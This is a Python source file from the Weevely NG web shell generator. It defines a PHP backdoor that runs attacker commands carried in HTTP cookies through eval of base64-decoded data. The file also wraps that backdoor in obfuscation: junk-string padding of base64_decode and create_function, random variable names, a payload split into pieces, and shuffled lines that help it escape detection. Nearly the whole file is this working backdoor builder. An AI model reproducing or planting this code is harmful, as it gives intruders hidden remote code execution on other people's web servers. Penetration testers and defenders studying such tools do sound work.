# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

import base64, codecs
from random import random, randrange, choice, shuffle
from pollution import pollute_with_static_str
from core.utils import randstr
from core.moduleexception import ModuleException
from string import Template, ascii_letters, digits

PERMITTED_CHARS = ascii_letters + digits + '_.~'

WARN_SHORT_PWD = 'Invalid password, use words longer than 3 characters'
WARN_CHARS = 'Invalid password, password permitted chars are \'%s\'' % PERMITTED_CHARS

class BdTemplate(Template):
    delimiter = '%'

class Backdoor:

    payload_template= """
$c='count';
$a=$_COOKIE;
if(reset($a)=='%STARTKEY' && $c($a)>3){
$k='%ENDKEY';
echo '<'.$k.'>';
eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
echo '</'.$k.'>';
}
"""

    backdoor_template = """<?php
$%PAY_VAR1="%PAY1";
$%PAY_VAR2="%PAY2";
$%PAY_VAR3="%PAY3";
$%PAY_VAR4="%PAY4";
$%REPL_FUNC = str_replace("%REPL_POLL","","%REPL_ENC");
$%B64_FUNC = $%REPL_FUNC("%B64_POLL", "", "%B64_ENC");
$%CREAT_FUNC = $%REPL_FUNC("%CREAT_POLL","","%CREAT_ENC");
$%FINAL_FUNC = $%CREAT_FUNC('', $%B64_FUNC($%REPL_FUNC("%PAY_POLL", "", $%PAY_VAR1.$%PAY_VAR2.$%PAY_VAR3.$%PAY_VAR4))); $%FINAL_FUNC();
?>"""


    def __init__( self, password ):

        self.__check_pwd(password)
        
        self.password  = password
        self.start_key = self.password[:2]
        self.end_key   = self.password[2:]
        self.payload = BdTemplate(self.payload_template).substitute(STARTKEY = self.start_key, ENDKEY = self.end_key).replace( '\n', '' )
        
        self.backdoor  = self.encode_template()
        
    def __str__( self ):
		return self.backdoor
        
    def __check_pwd(self, password):
        
        if len(password)<4:
            raise ModuleException('generate','\'%s\' %s' % (password, WARN_SHORT_PWD))   

        if ''.join(c for c in password if c not in PERMITTED_CHARS):
            raise ModuleException('generate','\'%s\' %s' % (password, WARN_CHARS))   

    def encode_template(self):
    	
    	b64_new_func_name = randstr()
    	b64_pollution, b64_polluted = pollute_with_static_str('base64_decode',frequency=0.7)
    	
    	createfunc_name = randstr()
    	createfunc_pollution, createfunc_polluted = pollute_with_static_str('create_function',frequency=0.7)
    	
    	payload_var = [ randstr() for st in range(4) ]
    	payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
    	
    	replace_new_func_name = randstr()
    	repl_pollution, repl_polluted = pollute_with_static_str('str_replace',frequency=0.7)
    	
    	final_func_name = randstr()
    	
    	length  = len(payload_polluted)
    	offset = 7
    	piece1	= length / 4 + randrange(-offset,+offset)
    	piece2  = length / 2 + randrange(-offset,+offset)
    	piece3  = length*3/4 + randrange(-offset,+offset)
    	
    	ts_splitted = self.backdoor_template.splitlines()
    	ts_shuffled = ts_splitted[1:6]
    	shuffle(ts_shuffled)
    	ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[6:]
    	self.backdoor_template = '\n'.join(ts_splitted)
    	
    	return BdTemplate(self.backdoor_template).substitute(
				B64_FUNC = b64_new_func_name,
				B64_ENC = b64_polluted, 
				B64_POLL = b64_pollution,
				CREAT_FUNC = createfunc_name,
				CREAT_ENC = createfunc_polluted,
				CREAT_POLL = createfunc_pollution,
				REPL_FUNC = replace_new_func_name,
				REPL_ENC = repl_polluted,
				REPL_POLL = repl_pollution,
				PAY_VAR1 = payload_var[0],
				PAY_VAR2 = payload_var[1],
				PAY_VAR3 = payload_var[2],
				PAY_VAR4 = payload_var[3],
				PAY_POLL = payload_pollution, 
				PAY1 = payload_polluted[:piece1],
				PAY2 = payload_polluted[piece1:piece2],
				PAY3 = payload_polluted[piece2:piece3],
				PAY4 = payload_polluted[piece3:],
				FINAL_FUNC = final_func_name)

    		
